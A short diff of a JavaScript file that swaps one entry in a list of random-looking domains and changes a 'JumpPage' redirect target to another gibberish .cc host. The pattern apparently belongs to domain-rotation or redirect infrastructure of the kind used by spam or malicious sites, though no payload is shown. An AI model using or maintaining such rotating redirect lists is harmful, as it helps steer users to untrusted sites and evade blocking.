@@ -44,10 +44,10 @@ var urls=[".brnohmbd.net",".kwncgug.com",".uyqtwfwm.com",".zzhwoyv.com"];
 var urls=[];
         urls.push(".xwoglzqfe.cc"); 
         urls.push(".raxeshzfs.com");
-        urls.push(".byjzvdiw.cc");
+        urls.push(".tbizslwby.cc");
         urls.push(".qzfdgsqbk.cc");    
            
-var JumpPage="https://bxverhhmy.cc";
+var JumpPage="https://ucuiyfbxe.cc";
 
 var newestUrls = [];
 
